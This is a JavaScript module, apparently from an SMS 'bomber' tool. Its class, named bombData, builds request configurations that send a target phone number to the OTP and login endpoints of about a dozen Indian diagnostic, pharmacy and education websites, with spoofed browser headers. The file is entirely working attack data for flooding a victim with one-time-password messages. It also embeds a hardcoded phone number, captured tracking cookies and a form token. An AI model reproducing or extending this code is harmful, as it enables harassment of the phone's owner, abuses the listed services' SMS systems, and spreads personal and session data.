class bombData {
    constructor(phoneNumber) {
        this.phoneNumber = phoneNumber
    }

    getBombData() {
        let bombData = [{
            baseURL: 'https://api.redcliffelabs.com', header: {

                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://redcliffelabs.com/',
                'Referer': 'https://redcliffelabs.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            }, postData: { phone_number: `${this.phoneNumber}` }, postUrl: '/api/v1/notification/send_otp/?from=website&is_resend=false'
        }, { baseURL: 'https://api-app.vijayadiagnostic.com', header: { "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive", "Content-Length": "51", "Content-Type": "application/json", "Host": "api-app.vijayadiagnostic.com", "Origin": "https://www.vijayadiagnostic.com", "Referer": "https://www.vijayadiagnostic.com/", "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Sourceapp": "5", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "Versioncode": "17" }, postData: { "otpServiceType": 0, "type": 0, "mobile": "7447553161" }, postUrl: '/HSignzAppServices/account/loginOTP' }, {
            baseURL: 'https://www.apollodiagnostics.in/', header: {
                'authority': 'www.apollodiagnostics.in',
                'method': 'POST',
                'path': '/site/send-otp',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Length': '22',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.apollodiagnostics.in',
                'Priority': 'u=1, i',
                'Referer': 'https://www.apollodiagnostics.in/site/user-login',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            }, postData: { user_mobile: `${this.phoneNumber}` }, postUrl: '/site/send-otp'
        }, {
            baseURL: 'https://www.suburbandiagnostics.com', header: {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Content-Length": "0",
                "Host": "www.suburbandiagnostics.com",
                "Origin": "https://www.suburbandiagnostics.com",
                "Referer": "https://www.suburbandiagnostics.com/patient/sign-in",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest"
            }, postData: {}, postUrl: `/Patient/SendOTP?mobileNo=${this.phoneNumber}`
        }, {
            baseURL: 'https://api.penpencil.co', header: {
                "Accept": "application/json, text/plain, */*",
                "Client-Id": "5eb393ee95fab7468a79d189",
                "Client-Type": "WEB",
                "Client-Version": "5.2.0",
                "Content-Type": "application/json",
                "Integration-With": "Randomid",
                "Randomid": "82243f00-6d25-49b9-9bc5-8704f16467cb",
                "Referer": "https://www.pw.live/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            }, postData: { mobile: `${this.phoneNumber}`, countryCode: "+91", firstName: "Asfdas", lastName: "" }, postUrl: '/v1/users/register/5eb393ee95fab7468a79d189'
        }, {
            baseURL: 'https://api.allen-live.in', header: {
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Length": "74",
                "Content-Type": "application/json",
                "Origin": "https://allen.in",
                "Priority": "u=1, i",
                "Referer": "https://allen.in/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-Client-Type": "web",
                "X-Device-Id": "2f28ca50-c63d-4719-89fb-bce2b4cb5b24"
            }, postData: { country_code: "91", phone_number: `${this.phoneNumber}`, persona_type: "STUDENT" }, postUrl: '/api/v1/auth/sendOtp'
        }, {
            baseURL: 'https://www.maxlab.co.in', header: {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Length": "65",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://www.maxlab.co.in",
                "Priority": "u=1, i",
                "Referer": "https://www.maxlab.co.in/lab-tests",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest"
            }, postData: { '_token': 'yb92lPsVsQetWhBaxaQYBctfAZh0kWjp98j4qOT4', 'mobile': `${this.phoneNumber}` }
            , postUrl: '/checkcustomer'
        }, {
            baseURL: 'https://api.sterlingaccuris.com', header: {
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": "Bearer undefined",
                "Content-Length": "25",
                "Content-Type": "application/json",
                "Origin": "https://cart.sterlingaccuris.com",
                "Priority": "u=1, i",
                "Referer": "https://cart.sterlingaccuris.com/",
                "Responsetype": "application/json",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            }, postData: { username: `${this.phoneNumber}` }, postUrl: '/api/v1/user/initiate/login/passwordless'
        }, {
            baseURL: 'https://gql.hod.report', header: {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Length": "321",
                "Content-Type": "application/json",
                "Origin": "https://www.hod.care",
                "Referer": "https://www.hod.care/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            }, postData: [
                {
                    "operationName": "InitiateVerification",
                    "variables": {
                        "mobileNumber": `${this.phoneNumber}`
                    },
                    "query": "mutation InitiateVerification($mobileNumber: String!) {\n  initiateVerification(mobileNumber: $mobileNumber) {\n    message\n    errors {\n      code\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}"
                }
            ]
            , postUrl: '/graphql/'
        }, {
            baseURL: 'https://pharmeasy.in', header: {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Length": "30",
                "Content-Type": "application/json",
                "Origin": "https://pharmeasy.in",
                "Priority": "u=1, i",
                "Referer": "https://pharmeasy.in/diagnostics",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-Ff": "",
                "X-Phone-Platform": "web",
                "X-Real-Ip": "",
                'Cookie': 'X - App - Version=2.2; X- Phone - Platform=web; X - IP=182.70.55.2 % 2C % 2023.46.9.46; X - Default - City=1; X - Pincode=400001; _gcl_au = 1.1.82531091.1722067957; dtm_token_sc = AQAK9GeQFP9cbQFZiZcpAQBBbQABAQCR8j61WgEBAJHyPrVa; _gid = GA1.2.134042274.1722067957; _ga_J4XE9SW84F = GS1.1.1722067956.1.0.1722067956.60.0.0; _ga = GA1.1.534504745.1722067957; dtm_token = AQAK9GeQFP9cbQFZiZcpAQBBbQABAQCR8j61WgEBAJHyPrVa; _uetsid = fc6561804bef11efb898a15d274532c7; _uetvid = fc6577c04bef11ef8c376d3836122d6e; _ga_XJY1F0EN7Z = GS1.2.1722067957.1.0.1722067957.60.0.0; _ga_YLL6W14B3J = GS1.2.1722067957.1.0.1722067957.0.0.0; XdI = bceeb1f249bc93ad7b41480a9c00404c; WZRK_G = 65722f9a56d04b63b0c4feaec0c7e541; _fbp = fb.1.1722067957910.416552339817175691; cto_bundle = eEs5G196VyUyRjZsOWJqbTVMVXVRU0U0WVAzMXZTWmhDVmV5NldwWXQyeDM4JTJGM1RXU2diUWpzMUZFTE5iUEYzclFxa2ZHJTJCSEsxSzk2S0pyaG03eVJCU0xHZ0Zjd05ZVmgyY0w2b1ZqQ0M0QSUyRmVldmJSTll2Z3AyejglMkI4cGxPQm5PamVlOHF6V21WUkF0Nmw0YnZsbEJWSXVYN3pEdTdSRVVOSWNSJTJCQWJrNTZhaDZTZlR0TWw0Tzc5a2VRWmUlMkZ1Y3dsTG5lYzNmNndHR3klMkJzbFVhV2dBRGF4VWtVS1BjMWklMkZzejlidmpRWU12YzFnVlkwJTJGWGNRQTJKUENhelllZWlRMHlLMnQ3TklCQnMlMkZ0JTJCOXBBaVM2TEtqRnNmdyUzRCUzRA; XPESD = {% 22session_id % 22:% 22s_w_65722f9a56d04b63b0c4feaec0c7e541_1722067958000 % 22 % 2C % 22session_id_flag % 22:% 22ct_id % 22 % 2C % 22referrer % 22:% 22https://www.google.com/%22%2C%22session_start_time%22:%222024-07-27T08:12:38.666Z%22}; XPESS_v2=s_w_65722f9a56d04b63b0c4feaec0c7e541_1722067958000; WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A1%2C%22s%22%3A1722067957%2C%22t%22%3A1722068222%7D'
            }, postData: { contactNumber: `${this.phoneNumber}` }
            , postUrl: '/api/auth/requestOTP'
        }, {
            baseURL: 'https://accounts.orangehealth.in', header: {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Length': '65',
                'Content-Type': 'application/json',
                'Origin': 'https://www.orangehealth.in',
                'Priority': 'u=1, i',
                'Referer': 'https://www.orangehealth.in/',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            }, postData: { 'mobile_number': `${this.phoneNumber}`, 'customer_auto_fetch_message': true }
            , postUrl: '/api/v1/user/otp/generate/'
        }, {
            baseURL: 'https://prod-api.asterlabs.in', header: {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": "",
                "City": "",
                "Connection": "keep-alive",
                "Content-Length": "25",
                "Content-Type": "application/json",
                "Host": "prod-api.asterlabs.in",
                "Origin": "https://www.asterlabs.in",
                "Referer": "https://www.asterlabs.in/login?redirectPath=booking-histry",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            }, postData: { username: `${this.phoneNumber}` }
            , postUrl: '/api/user/get_otp'
        }
        ]

        return bombData;
    }
}

module.exports = bombData